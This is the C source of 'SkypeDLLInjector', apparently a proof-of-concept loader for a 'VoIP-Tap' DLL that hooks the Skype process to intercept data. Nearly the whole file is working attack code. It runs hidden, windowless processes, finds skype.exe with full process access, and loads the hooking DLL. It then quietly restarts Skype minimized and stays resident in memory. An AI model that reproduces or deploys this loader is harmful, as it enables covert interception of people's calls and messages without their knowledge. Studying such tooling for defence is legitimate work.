/*
 * Tool name   : SkypeDLLInjector
 * Description : This is a proof of concept tool to show how to inject a DLL
 *               into a remote process and proxying functions to intercept
 *               data.
 * Author      : carrumba
 * Webpage     : http://www.megapanzer.com
 * Version     : 0.1
 * OS          : Tested on Microsoft Windows XP
 * Todo        : -
 *
 * Changes     : - 
 * 
 *
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */


#include <stdio.h>
#include <windows.h>
#include <Psapi.h>
#include <tlhelp32.h>
#include <Shlwapi.h>
#include <tchar.h>
#include <stdlib.h>

#define snprintf _snprintf
#define MAX_BUF_SIZE 1024
#define SKYPE_BINARY "skype.exe"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "Psapi.lib")




/*
 * Function forward declarations
 *
 */

void LowerToUpper(char *pString);
int findAProcess(char *pBinaryFullPath, char *pProcessName);




/*
 * Program entry point
 *
 */

int main(int argc, char **argv)
{
  int lRetVal = 0;
  HINSTANCE mDll = 0;
  STARTUPINFO si;
  PROCESS_INFORMATION  pi;
  char mTemp[MAX_BUF_SIZE + 1];
  char *mLoaderBinaryPointer = NULL;
  char *mTempPointer = NULL;
  char mCmdLine[MAX_BUF_SIZE + 1];
  char mSkypeBinaryPattern[MAX_BUF_SIZE + 1];
  int mCounter = 0;
  int mLibraryLoaded = 0;
  char mSkypeBinaryPath[MAX_BUF_SIZE + 1];





  /*
   * If loader was called without an argument, call it again with the VoIP-Tap dll path as argument.
   * From there on, the VoIP-Tap hooking mechanism will be initialized.
   *
   */

  if (argc == 2)
  {
    if (argv[1])
    {
      ZeroMemory(&si, sizeof(si));
      ZeroMemory(&pi, sizeof(pi));
      si.cb = sizeof(si);
      si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
      si.wShowWindow = SW_HIDE;



      /*
       * create the VR loader process
       *
       */

      ZeroMemory(mCmdLine, sizeof(mCmdLine));
      snprintf(mCmdLine, sizeof(mCmdLine) - 1, "\"%s\" \"%s\" 1", argv[0], argv[1]);
      CreateProcess(NULL, mCmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW|CREATE_NEW_CONSOLE, 0, NULL, &si, &pi);
    }



  /*
   * This is the constant VoIP-Tap loader part that loads the VoIP-Tap dll to set the
   * windows hook and inject the interception functions to the skype process.
   * The endless loop keeps the windows hook up.
   *
   */

  } else if (argc == 3) {

    if (PathFileExists(argv[1]))
    {
      ZeroMemory(mSkypeBinaryPath, sizeof(mSkypeBinaryPath));
      ZeroMemory(mSkypeBinaryPattern, sizeof(mSkypeBinaryPattern));

      strncpy(mSkypeBinaryPattern, SKYPE_BINARY, sizeof(mSkypeBinaryPattern) - 1);
      LowerToUpper(mSkypeBinaryPattern);


      if (findAProcess(mSkypeBinaryPath, mSkypeBinaryPattern) == 0)
      {

        /*
         * Prepare Skype start before finishing
         *
         */

        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;


        /*
         * Start new loader process
         *
         */

        if((mDll = LoadLibrary(argv[1])) == NULL)
        {
          if (strlen(mSkypeBinaryPath) > 0)
            CreateProcess(NULL, mSkypeBinaryPath, NULL, NULL, FALSE, CREATE_NO_WINDOW|CREATE_NEW_CONSOLE, 0, NULL, &si, &pi);  

          return;
        }

        mLibraryLoaded = 1;





        /*
         * Stop skype process softly.
         *
         */

        Sleep(1000);
        ZeroMemory(mTemp, sizeof(mTemp));
        snprintf(mTemp, sizeof(mTemp) - 1, "%s /shutdown", mSkypeBinaryPath);
        CreateProcess(NULL, mTemp, NULL, NULL, FALSE, CREATE_NO_WINDOW|CREATE_NEW_CONSOLE, 0, NULL, &si, &pi);



        /*
         * Start process
         *
         */

        Sleep(2000);
        ZeroMemory(mTemp, sizeof(mTemp));
        snprintf(mTemp, sizeof(mTemp) - 1, "%s /minimized /nosplash", mSkypeBinaryPath);
        CreateProcess(NULL, mTemp, NULL, NULL, FALSE, CREATE_NO_WINDOW|CREATE_NEW_CONSOLE, 0, NULL, &si, &pi);
	  } // if (findAProces...



      if(mLibraryLoaded == 0 && (mDll = LoadLibrary(argv[1])) == NULL)
      {
        if (strlen(mSkypeBinaryPath) > 0)
          CreateProcess(NULL, mSkypeBinaryPath, NULL, NULL, FALSE, CREATE_NO_WINDOW|CREATE_NEW_CONSOLE, 0, NULL, &si, &pi);  

        return;
      }



      /*
       * Endless loop to stay permanently in memory
	   *
       */

      while(1)
	  {
        printf(".");
        Sleep(100);
	  }
	} else {
      printf("%s does not exist\n", argv[1]);
	} // if (PathFileExi...
  } else {
    printf("Usage : %s dll-path\n", argv[0]);
  } // if (argc == 3)...


  return(lRetVal);
}








/*
 * find a particular process
 *
 */

int findAProcess(char *pBinaryFullPath, char *pProcessName)
{
  HANDLE hProcessSnap;
  HANDLE hProcess;
  PROCESSENTRY32 pe32;
  char mTemp[MAX_BUF_SIZE + 1];
  char mBinaryName[MAX_BUF_SIZE + 1];
  HMODULE hMods[1024];
  DWORD cbNeeded;
  int mCounter = 0;
  int lRetVal = 2;



  if((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
  {
    lRetVal = 1;
    goto END;
  }


  pe32.dwSize = sizeof(PROCESSENTRY32);


  /*
   * walk the snapshot of processes, and display information
   * about each process in turn
   *
   */

  if(Process32First(hProcessSnap, &pe32))
  {
    do
    {
      ZeroMemory(mTemp, sizeof(mTemp));
      LowerToUpper(pe32.szExeFile);

      if((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)) != NULL)
      {
        if(EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded) != 0)
        {
          // Get the full path to the binary.
          if (GetModuleFileNameEx(hProcess, hMods[0], mBinaryName, sizeof(mBinaryName)))
          {
            LowerToUpper(mBinaryName);
            snprintf(mTemp, sizeof(mTemp) -1, "%s", mBinaryName);

            if (strstr(mTemp, pProcessName) != NULL)
            {
              strncpy(pBinaryFullPath, mTemp, sizeof(mTemp));
              lRetVal = 0;
              goto END;
            }
          }
        }
        CloseHandle(hProcess);
        hProcess = INVALID_HANDLE_VALUE;
      }
    } while(Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    hProcessSnap = INVALID_HANDLE_VALUE;
  }

END:

  if (hProcessSnap != INVALID_HANDLE_VALUE)
    CloseHandle(hProcessSnap);

  if (hProcess != INVALID_HANDLE_VALUE)
    CloseHandle(hProcess);


  return(lRetVal);
}





/*
 * 
 *
 */

void LowerToUpper(char *pString)
{
  int mCounter;
  int mStrLen;
       

  mStrLen = (int) strlen(pString);

  for(mCounter = 0; mCounter < mStrLen; mCounter++)
    if(pString[mCounter] >= 97 && pString[mCounter] < 123)
      pString[mCounter] -= 32;  
}
